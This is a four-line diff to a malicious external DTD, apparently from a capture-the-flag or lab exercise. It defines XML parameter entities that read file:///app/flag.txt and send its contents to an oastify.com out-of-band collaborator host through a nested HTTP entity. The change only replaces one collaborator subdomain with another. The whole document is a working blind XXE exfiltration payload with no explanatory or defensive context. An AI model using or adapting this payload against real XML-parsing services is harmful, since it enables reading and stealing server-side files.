@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "file:///app/flag.txt">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://whhm6bvmajwxz8chvu1mhi9b82eu2kq9.oastify.com/?x=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://u94ky9nk2hovr64fnstk9g19006suji8.oastify.com/?x=%file;'>">
 %eval;
 %exfiltrate;
